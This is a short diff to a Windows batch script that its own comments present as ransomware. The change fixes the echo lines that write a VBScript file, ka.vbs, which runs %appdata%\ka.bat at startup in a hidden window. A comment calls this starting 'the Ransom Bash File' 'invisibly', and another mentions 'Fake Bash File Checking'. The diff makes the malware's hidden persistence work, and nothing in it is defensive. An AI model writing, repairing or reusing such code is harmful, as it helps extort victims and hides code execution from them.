@@ -35,9 +35,10 @@ echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 set /p web= :  
 
 ::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
-echo "Set WshShell = CreateObject("WScript.Shell")" >> ka.vbs
-echo "WshShell.run chr(34) & "%appdata%\ka.bat" % Chr(34), 0" >> ka.vbs
-echo "Set WshShell = Nothing" >> ka.vbs
+
+echo Set WshShell = CreateObject("WScript.Shell") >> ka.vbs
+echo WshShell.run chr(34) & "%appdata%\ka.bat" % Chr(34), 0 >> ka.vbs
+echo Set WshShell = Nothing >> ka.vbs
 
 ::Fake Bash File Checking::
 cls 
